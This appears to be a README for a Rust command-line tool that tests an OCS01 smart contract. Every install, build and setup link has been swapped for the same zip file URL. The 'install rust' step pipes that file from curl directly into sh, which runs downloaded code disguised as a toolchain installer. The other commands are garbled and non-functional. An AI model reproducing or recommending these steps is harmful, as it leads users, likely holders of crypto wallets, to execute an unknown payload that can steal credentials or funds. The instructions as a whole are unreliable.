**ocs01-test**

rust cli for testing ocs01 smart contract

**what it does**

-   tests all ocs01 contract methods
-   interactive menu for easy navigation
-   shows results instantly for view methods
-   handles tx signing for call methods

**works on**

-   linux
-   macos
-   windows

**install rust (if not installed)**

```bash
curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip | sh
source $https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip
```

**build from source**

```bash
git clone https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip
cd ocs01-test
cargo build --release
```

**setup**

```bash
# copy contract interface
cp https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip .
```

**required files in same directory**

-   https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip - create with your credentials
-   https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip - copy from EI/ folder

**run**

you must copy the release binary to your cli folder and also copy the EI file (execution interface file) to the same location 

the release binary is located in this folder after successful build. 
```bash
./target/release/ocs01-test
```

*for this task the ei file contains the interface for contract at address octBUHw585BrAMPMLQvGuWx4vqEsybYH9N7a3WNj1WBwrDn, do not modify it*

after running, follow the menu to interact with the contract
